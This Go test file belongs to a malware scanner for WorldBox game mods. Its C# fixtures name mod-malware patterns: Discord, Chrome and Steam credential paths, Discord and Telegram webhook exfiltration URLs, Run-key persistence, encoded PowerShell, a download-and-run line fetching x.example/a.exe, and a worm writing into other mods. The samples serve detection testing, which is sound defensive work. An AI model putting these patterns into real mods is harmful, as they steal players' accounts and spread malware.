package scan

import (
	"os"
	"path/filepath"
	"testing"
)

// The test mods below are harmless: their C# only names what malware
// does (the way antivirus tests use the EICAR file). Nothing compiles or
// runs them.

func writeMod(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for name, body := range files {
		p := filepath.Join(root, filepath.FromSlash(name))
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

const modJSON = `{"name":"Test","author":"Me","version":"1.0"}`

func worst(r *Report) (Severity, []string) {
	m := Severity(-1)
	var rules []string
	for _, f := range r.Findings {
		if f.Severity > m {
			m = f.Severity
		}
		if f.Severity >= High {
			rules = append(rules, f.Rule)
		}
	}
	return m, rules
}

func hasSev(r *Report, rule string, sev Severity) bool {
	for _, f := range r.Findings {
		if f.Rule == rule && f.Severity == sev {
			return true
		}
	}
	return false
}

// What ordinary WorldBox mods do (found across ~240 real mods) stays below
// HIGH: Harmony patches, reflection, config files, own folders, opening a
// web page.
func TestEverydayModIsQuiet(t *testing.T) {
	root := writeMod(t, map[string]string{
		"mod.json": modJSON,
		"Code/Main.cs": `using System; using System.IO; using System.Reflection; using HarmonyLib; using UnityEngine;
namespace Test {
  public class Main : MonoBehaviour {
    void Awake() {
      new Harmony("me.test").PatchAll();
      var f = typeof(Actor).GetField("data", BindingFlags.NonPublic | BindingFlags.Instance);
      string dir = Path.Combine(Application.persistentDataPath, "mods_config");
      Directory.CreateDirectory(dir);
      File.WriteAllText(Path.Combine(dir, "test.json"), "{}");
      foreach (var p in Directory.GetFiles(dir)) if (p.EndsWith(".old")) File.Delete(p);
      Application.OpenURL("https://gamebanana.com/mods/1");
    }
  }
}`,
	})
	r, err := Mod(root, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if s, rules := worst(r); s >= High {
		t.Errorf("an everyday mod got %v: %v", s, rules)
	}
}

func TestMalwarePatterns(t *testing.T) {
	cases := map[string]struct {
		code string
		rule string
	}{
		"discord token grabber": {`class A { string p = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb"; }`, "steals-secrets"},
		"browser passwords":     {`class A { string p = "\\Google\\Chrome\\User Data\\Default\\Login Data"; }`, "steals-secrets"},
		"token regex":           {`class A { Regex r = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"); }`, "steals-secrets"},
		"steam session":         {`class A { string p = steamPath + "\\ssfn" + n; }`, "steals-secrets"},
		"webhook":               {`class A { string u = "https://discord.com/api/webhooks/1/abc"; }`, "exfiltration"},
		"webhook in base64":     {`class A { string u = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMS9hYmM="; }`, "exfiltration"},
		"telegram bot":          {`class A { string u = "https://api.telegram.org/bot123/sendDocument"; }`, "exfiltration"},
		"autostart":             {`class A { string k = @"Software\Microsoft\Windows\CurrentVersion\Run"; }`, "persistence"},
		"linux autostart":       {`class A { string p = home + "/.config/autostart/x.desktop"; }`, "persistence"},
		"encoded powershell":    {`class A { string c = "powershell -enc SQBFAFgA"; }`, "dropper"},
		"workshop upload":       {`class A { void F() { SteamUGC.SubmitItemUpdate(h, "update"); } }`, "workshop-upload"},
		"steam chat spam":       {`class A { void F() { SteamFriends.ReplyToFriendMessage(id, "free skins"); } }`, "steam-messages"},
		"dropper": {`using System.Net; using System.Diagnostics;
class A { void F() { new WebClient().DownloadFile("https://x.example/a.exe", "a.exe"); Process.Start("a.exe"); } }`, "download-and-run"},
		"worm into other mods": {`using System.IO;
class A { void F() { foreach (var d in Directory.GetDirectories(root + "/workshop/content/1206560")) File.WriteAllText(Path.Combine(d, "Main.cs"), me); } }`, "tampers-with-mods"},
	}
	for name, c := range cases {
		root := writeMod(t, map[string]string{"mod.json": modJSON, "Code/A.cs": c.code})
		r, err := Mod(root, Options{})
		if err != nil {
			t.Fatal(err)
		}
		if !hasSev(r, c.rule, Critical) {
			_, rules := worst(r)
			t.Errorf("%s: no CRITICAL %s (got %v)", name, c.rule, rules)
		}
	}
}

// "transfer.sh" is a file host; "transfer.Should" is not.
func TestWholeWords(t *testing.T) {
	root := writeMod(t, map[string]string{"mod.json": modJSON,
		"Code/A.cs": `class A { bool F() { return factionTransfer.ShouldRun; } string s = "classfName"; }`})
	r, _ := Mod(root, Options{})
	if s, rules := worst(r); s >= High {
		t.Errorf("got %v: %v", s, rules)
	}
}

// Code NML never runs is reported, but only as information.
func TestOnlyWhatNMLLoads(t *testing.T) {
	evil := `class A { string u = "https://discord.com/api/webhooks/1/abc"; }`
	root := writeMod(t, map[string]string{
		"mod.json":                    modJSON,
		"Code/Main.cs":                `class Main {}`,
		"bin/Debug/Old.cs":            evil, // NML skips bin/
		"GameResources/notes.cs":      evil, // and art folders
		"Assemblies/Ref/Deep.cs":      evil, // compiled: under the mod, not skipped
		"Assemblies/Ref/Deep.cs.orig": evil,
	})
	r, _ := Mod(root, Options{})
	for _, f := range r.Findings {
		if f.Severity == Critical && f.File != filepath.FromSlash("Assemblies/Ref/Deep.cs") {
			t.Errorf("CRITICAL in a file NML doesn't load: %+v", f)
		}
	}
	if !hasSev(r, "exfiltration", Critical) {
		t.Error("the compiled file under Assemblies/Ref was not checked")
	}

	// A mod with a DLL at its top level is precompiled: NML loads the DLL
	// and compiles none of its .cs files.
	root = writeMod(t, map[string]string{"mod.json": modJSON, "Code/A.cs": evil, "Mod.dll": "not really a dll"})
	r, _ = Mod(root, Options{})
	if hasSev(r, "exfiltration", Critical) {
		t.Error("a precompiled mod's .cs file counted as compiled")
	}
}

// Spread across a mod (a bundled tool here, an AI client there), network
// plus running programs is a note; in the same code it's a dropper.
func TestCombinationsPerFile(t *testing.T) {
	root := writeMod(t, map[string]string{"mod.json": modJSON,
		"Code/Ai.cs":     `using System.Net.Http; class Ai { HttpClient c = new HttpClient(); }`,
		"Code/Folder.cs": `using System.Diagnostics; class F { void Open(string d) { Process.Start(d); } }`})
	r, _ := Mod(root, Options{})
	if hasSev(r, "download-and-run", Critical) {
		t.Error("network and Process.Start in unrelated files counted as a dropper")
	}
	if !hasSev(r, "network-and-run", High) {
		t.Errorf("no note for network + run across files: %+v", r.Findings)
	}
}

func TestLooseReplacementGameCode(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("testdata", "dll", "clean.dll"))
	if err != nil {
		t.Fatal(err)
	}
	root := writeMod(t, map[string]string{"readme.txt": "replace the game's file"})
	os.WriteFile(filepath.Join(root, "Assembly-CSharp.dll"), b, 0o644)
	r, _ := Mod(root, Options{})
	// clean.dll's assembly isn't named Assembly-CSharp: scanned as code.
	for _, f := range r.Findings {
		if f.Rule == "replaces-game-code" {
			t.Errorf("a DLL merely named Assembly-CSharp.dll was vouched for: %+v", f)
		}
	}
}
